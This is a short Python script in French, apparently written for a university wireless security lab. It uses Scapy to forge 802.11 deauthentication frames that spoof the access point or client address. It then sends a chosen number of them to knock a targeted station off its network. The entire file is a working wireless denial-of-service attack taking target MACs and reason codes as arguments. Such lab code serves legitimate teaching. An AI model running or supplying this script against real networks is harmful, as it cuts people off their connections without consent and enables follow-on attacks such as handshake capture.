# Sources : 
# http://www.bitforestinfo.com/2017/06/how-to-create-and-send-wireless-deauthentication-packets-using-python-and-scapy.html
# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
#
# Auteurs : Benoit Julien et Sutcu Volkan
# But: déauthentifier une station connecté à une AP avec un nombre de paquets via une interface de monitoring et avec un reason code précis
# Date : 09.03.2020

from scapy.all import *
import argparse

# Paramètres à fournir au script pour construire le paquet qui va permettre de déauthentifier une station
parser = argparse.ArgumentParser(prog="deauth.py", description="Deauthentication script for SWI Lab")
conf.verb = 0
parser.add_argument("-n", "--Number", required=True, help="Number of sending packets")
parser.add_argument("-a", "--BSSID", required=True, help="BSSID of AP")
parser.add_argument("-c", "--Client", required=True, help="Client who is targeted")
parser.add_argument("-i", "--Interface", required=True, help="Interface which sends packets")
parser.add_argument("-r", "--Code", required=True, help="Reason Code for packets which sent.", choices=['1', '4', '5', '8'])
tab_args = parser.parse_args()

# Le reason code 8 est envoyé par le client à l'AP. Les reason codes 1, 4 et 5 sont envoyés par l'AP au client 
if int(tab_args.Code) == 8:
    	packet = RadioTap() / Dot11(type=0, subtype=12, addr1=tab_args.BSSID, addr2=tab_args.Client, addr3=tab_args.Client) / Dot11Deauth(reason=int(tab_args.Code))
else: 
	packet = RadioTap() / Dot11(type=0, subtype=12, addr1=tab_args.Client, addr2=tab_args.BSSID, addr3=tab_args.BSSID) / Dot11Deauth(reason=int(tab_args.Code))    

# Permet d'envoyer des paquets de déauthentification selon le nombre de paquets entré en paramètre
for i in range(int(tab_args.Number)):
	sendp(packet, iface=tab_args.Interface)
	print("Packet n°" + str(i+1))
